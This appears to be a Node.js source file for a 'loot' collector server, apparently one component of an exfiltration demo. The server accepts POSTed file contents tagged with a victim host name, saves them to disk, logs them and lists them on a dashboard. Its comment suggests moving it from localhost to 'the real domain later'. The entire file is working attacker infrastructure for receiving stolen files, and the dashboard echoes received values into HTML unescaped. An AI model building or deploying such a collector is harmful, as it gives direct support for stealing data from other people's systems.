// Tiny collector so the demo is self-contained. Point the app at
// http://127.0.0.1:8787/collect (or at the real domain later).
const fs = require("node:fs");
const http = require("node:http");
const path = require("node:path");

const PORT = Number(process.env.PORT || 8787);
const LOOT = path.join(__dirname, "loot");
fs.mkdirSync(LOOT, { recursive: true });

const received = [];

const server = http.createServer((req, res) => {
  if (req.method === "POST") {
    let body = "";
    req.on("data", (chunk) => {
      body += chunk;
      if (body.length > 5e6) req.destroy();
    });
    req.on("end", () => {
      let payload;
      try {
        payload = JSON.parse(body);
      } catch {
        res.writeHead(400).end("bad json");
        return;
      }
      const stamp = new Date().toISOString().replace(/[:.]/g, "-");
      const safe = String(payload.file || "unknown").replace(/[^\w.-]+/g, "_").slice(-60);
      const name = `${stamp}__${payload.host || "host"}__${safe}`;
      fs.writeFileSync(path.join(LOOT, name), payload.content || "");
      received.push({ name, file: payload.file, host: payload.host, bytes: (payload.content || "").length });
      console.log(`[loot] ${payload.host} ${payload.file} (${(payload.content || "").length} b)`);
      res.writeHead(200, { "content-type": "application/json" }).end('{"ok":true}');
    });
    return;
  }

  if (req.url === "/") {
    res.writeHead(200, { "content-type": "text/html; charset=utf-8" }).end(`<!doctype html>
<meta charset="utf-8"><title>loot</title>
<body style="font:14px ui-monospace,monospace;background:#0b0f14;color:#c8d3e0;padding:24px">
<h2 style="color:#7ee787">received ${received.length}</h2>
${received.map((r) => `<div>${r.host} &nbsp; ${r.file} &nbsp; ${r.bytes} b</div>`).join("") || "<p>nothing yet</p>"}
<p style="color:#5b6673">files on disk: ${LOOT}</p>`);
    return;
  }

  res.writeHead(404).end("nope");
});

server.listen(PORT, () => console.log(`collector on http://127.0.0.1:${PORT}/collect`));
